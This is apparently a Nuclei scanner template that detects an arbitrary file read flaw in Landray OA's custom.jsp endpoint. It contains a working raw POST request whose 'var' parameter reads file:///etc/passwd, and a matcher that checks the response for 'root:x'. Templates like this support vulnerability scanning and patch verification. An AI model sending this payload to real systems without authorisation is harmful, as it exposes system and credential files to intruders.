id: lanlin-oa-fileRead
info:
  author: Str1am
  name: "\u84DD\u51CCOA custom.jsp \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
  severity: high
  tags: lanlin,oa
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
  matchers-condition: and
  raw:
  - 'POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1

    Host: {{Hostname}}

    content-type: application/x-www-form-urlencoded


    var={"body":{"file":"file:///etc/passwd"}}

    '
